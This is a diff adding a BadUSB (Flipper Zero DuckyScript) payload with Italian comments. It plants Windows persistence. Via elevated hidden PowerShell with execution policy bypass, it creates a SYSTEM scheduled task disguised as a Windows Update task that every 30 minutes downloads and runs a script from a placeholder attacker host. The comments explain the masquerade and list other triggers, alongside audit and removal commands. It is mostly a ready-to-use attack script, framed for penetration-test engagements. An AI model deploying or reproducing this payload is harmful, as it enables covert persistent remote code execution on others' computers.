@@ -1,0 +1,37 @@
+REM ============================================================
+REM Title:    Scheduled Task Persistence
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Persistence
+REM Privs:    Admin REQUIRED
+REM Layout:   IT
+REM Time:     ~6 secondi
+REM Detect:   Medio - schtasks è monitorato ma legittimo
+REM Desc:     Crea uno scheduled task che esegue il payload
+REM           ogni 30 minuti. Si maschera come task di sistema.
+REM CHANGE:   ATTACKER_IP e ATTACKER_PORT
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs -ArgumentList '-w hidden -ep bypass -c "schtasks /create /tn ''Microsoft\Windows\WindowsUpdate\UpdateCheck'' /tr ''powershell -w hidden -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''''http://ATTACKER_IP:8080/beacon.ps1'''')'' /sc minute /mo 30 /ru SYSTEM /f"'
+ENTER
+DELAY 2000
+ALT y
+
+REM ============================================================
+REM NOTA: Il nome del task imita un task legittimo di Windows
+REM Update per ridurre i sospetti. In un audit:
+REM
+REM Verifica task esistenti:
+REM   schtasks /query /fo TABLE /nh
+REM
+REM Rimozione post-engagement:
+REM   schtasks /delete /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /f
+REM
+REM Alternative di persistence via task:
+REM - /sc onlogon  → ad ogni login
+REM - /sc onidle   → quando il sistema è idle
+REM - /sc onstart  → all'avvio del sistema
+REM ============================================================
